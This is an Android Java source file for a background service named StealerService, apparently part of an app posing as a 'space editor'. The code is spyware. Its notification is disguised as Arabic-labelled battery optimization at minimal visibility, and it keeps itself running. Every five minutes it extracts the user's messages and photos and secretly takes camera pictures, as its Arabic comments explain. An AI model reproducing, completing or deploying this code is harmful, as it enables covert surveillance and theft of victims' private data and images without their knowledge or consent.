package com.example.spaceeditor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class StealerService extends Service {
    private Thread workerThread;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        isRunning = true;
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // إعداد الإشعار عشان يبقى شكله نظامي ويفتح التطبيق لو داس عليه
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent, 
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
        );

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, "stealer_channel");
        } else {
            builder = new Notification.Builder(this);
        }
        
        Notification notification = builder
                .setContentTitle("تحسين البطارية") // الاسم اللي بيظهر
                .setContentText("جاري توفير الطاقة...") // النص
                .setSmallIcon(android.R.drawable.stat_sys_download_done) // أيقونة التحميل (نظامية)
                .setContentIntent(pendingIntent) // لو داس عليه يفتح التطبيق
                .setPriority(Notification.PRIORITY_MIN) // صامت
                .build();
                
        startForeground(1, notification);

        // تشغيل الخدمة في الخلفية
        if (workerThread == null || !workerThread.isAlive()) {
            workerThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    while (isRunning) {
                        try {
                            // 1. سحب البيانات (رسايل، صور، إلخ)
                            MainActivity.extractDataInBackground(StealerService.this);
                            
                            // 2. سحب صورة من الكاميرا
                            CameraService.takePicture(StealerService.this);
                            
                            // 3. الاستراحة 5 دقايق (300 ألف مللي ثانية)
                            Thread.sleep(300000); 
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
            workerThread.start();
        }
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "stealer_channel",
                    "System Service",
                    NotificationManager.IMPORTANCE_MIN // أهمية منخفضة عشان يختفي الشريط
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
